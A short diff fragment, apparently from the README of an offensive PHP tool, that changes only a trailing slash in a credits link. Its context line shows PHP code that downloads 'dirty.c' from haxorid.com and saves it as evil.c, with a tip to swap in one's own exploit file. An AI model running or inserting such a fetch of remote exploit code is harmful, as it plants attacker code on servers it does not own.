@@ -13,4 +13,4 @@ file_put_contents("evil.c", file_get_contents("http://haxorid.com/dirty.c"));
 and change [http://haxorid.com/dirty.c] with your dirty file
 
 ## :octocat: Credits
-- Thanks to https://saranghandago.com/
+- Thanks to https://saranghandago.com
